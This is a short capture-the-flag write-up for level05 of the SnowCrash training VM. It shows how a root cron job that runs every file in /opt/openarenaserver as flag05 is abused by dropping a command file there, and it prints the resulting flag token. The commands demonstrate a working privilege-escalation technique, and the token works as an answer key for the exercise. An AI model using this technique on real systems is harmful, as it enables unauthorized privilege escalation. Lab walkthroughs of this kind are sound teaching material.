How to find:

Search a file that can be run by flag05 user:

level05@SnowCrash:~$ find / -user flag05 2> /dev/null 
    /usr/sbin/openarenaserver
    /rofs/usr/sbin/openarenaserver


level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done


.Gets all file of the directory /opt/openarenaserver/ 
.Set the CPU time limit to 5 Seconds (ulimit -t 5; bash -x "$i")
    .Execute the file that is being processed
. Delete the file rm -f "$i"

I create a .bin file but when I run it I don't have the permissions.
level05@SnowCrash:~$ bash /usr/sbin/openarenaserver 
bash: /opt/openarenaserver/*: No such file or directory

But searching for the name of level05 I find these files

level05@SnowCrash:~$ find / -name level05 2> /dev/null 
/var/mail/level05
/rofs/var/mail/level05

The file has this content
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

It is a script or server execution by cron job that according to https://crontab.guru/#*/2_*/2_*_*_*_*_*_* is executed every two minutes, where permissions are given to level05

We now have the script to run the command in /opt/openarenaserver/.
echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
It is common to use /tmp for such operations when the result needs to be stored temporarily and is not required to be persistent in the long term.


level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc

